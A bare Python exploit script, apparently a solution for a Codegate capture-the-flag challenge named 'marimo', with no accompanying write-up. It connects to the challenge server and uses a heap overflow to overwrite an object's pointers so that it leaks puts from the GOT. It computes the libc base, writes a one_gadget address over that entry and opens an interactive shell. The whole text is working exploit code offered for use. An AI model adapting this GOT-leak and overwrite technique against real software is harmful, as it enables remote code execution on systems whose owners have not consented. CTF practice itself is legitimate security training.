from ntpwn import *

e = ELF('./marimo')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
s = remote('ch41l3ng3s.codegate.kr',3333)
#s = process('./marimo')
'''
b = BP(s)
b.bp('tracemalloc on')
'''

def buy(size,pay,name,profile):
	s.sendlineafter('>> ','B')
	s.sendlineafter('>> ',size)
	s.sendlineafter('>> ',pay)
	s.sendlineafter('>> ',name)
	s.sendlineafter('>> ',profile)

def sell(idx,pay):
	s.sendlineafter('>> ','S')
	s.sendlineafter('>> ',idx)
	s.sendlineafter('?',pay)

def hidden(name,profile):
	s.sendlineafter('>> ','show me the marimo')
	s.sendlineafter('>> ',name)
	s.sendlineafter('>> ',profile)

def edit(idx,modi,profile): 
	s.sendlineafter('>> ','V')
	s.sendlineafter('>> ',idx)
	s.sendlineafter('?',modi)
	s.sendlineafter('>> ',profile)
	s.sendlineafter('>> ','B')
'''
b.bp64(0xba8)
b.bp('c')
b.done()
'''	
pause()
for i in range(2): 
	hidden('A' * 8, 'B' * 8)

for i in range(6):
	print "SLEEP"
	sleep(1)
payload = 'A' * 0x28
payload += 'A' * 8 + p64(100) + p64(e.got['puts']) * 2
edit('0','M',payload)
s.sendlineafter('>> ','V')
s.sendlineafter('>> ','1')
s.recvuntil('name : ')
libc_base = u64(s.recv(6) + "\x00" * 2) - l.symbols['puts']

log.info("libc :" + hex(libc_base))

s.sendlineafter('?','M')
s.sendlineafter('>> ',p64(libc_base + 0x45216))



s.interactive()
